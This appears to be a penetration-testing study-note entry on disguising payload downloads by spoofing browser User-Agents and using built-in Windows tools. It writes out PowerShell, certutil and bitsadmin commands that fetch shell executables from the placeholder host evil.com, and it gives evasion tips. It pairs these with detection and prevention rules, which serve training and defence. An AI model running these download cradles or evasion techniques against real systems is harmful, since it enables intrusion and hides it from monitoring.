examples.label: CPTS Ch07 — Chrome UA for Invoke-WebRequest

notes: Set a legit-looking User-Agent (or match the org's browser) on your download cradle so it blends into proxy logs. Pair with an allowed source port and HTTPS to reduce detection. Defenders monitor for PowerShell/5.1 User-Agent on web proxy logs. Swap to Chrome, Firefox, or COM-based requests to blend in. Each method sends a different UA: WebClient→WindowsPowerShell, WinHttpRequest→WinHttp.WinHttpRequest, BITS→Microsoft BITS, Certutil→Microsoft-CryptoAPI. Also covered in: CPTS Ch07 (File Transfers).
name: Evasion - Custom User-Agent Download
description: Blend downloads into normal browsing by spoofing a real browser User-Agent, and prefer alternate methods (WinHttp/Msxml2/LOLBins) that don't match PowerShell signatures.

defense.why_it_works: Security tools flag transfers by their default User-Agent (certutil -> Microsoft-CryptoAPI, PowerShell -> WindowsPowerShell/5.1, BITS -> Microsoft BITS/7.8 - HTB M07). Setting a common browser User-Agent makes the request blend with normal web traffic and defeats UA-based detection.
defense.prerequisites: A download method that lets you set the UA (PowerShell -UserAgent, curl -A, wget -U) and egress to the attacker host.
defense.impact: The transfer evades User-Agent analysis, appearing as ordinary browser traffic in proxy/web logs.
defense.detection: UA analysis still catches KNOWN-BAD or anomalous UAs, and behavioural correlation flags a browser UA emitted by a NON-browser process (e.g. powershell.exe) - so process+UA SIEM correlation and command-line logging still detect it.
defense.artifacts: The spoofed UA in proxy/web logs; the -UserAgent/-A argument in the command line (4688 / 4104).
defense.prevention: Correlate User-Agent with the initiating process (a browser UA from powershell.exe is suspicious); command-line and script-block logging; egress filtering regardless of UA.
defense.evasion: Pick a UA string matching the organisation's standard browser build; combine with HTTPS and an allowed domain so both the UA and the destination look normal.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering — block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'
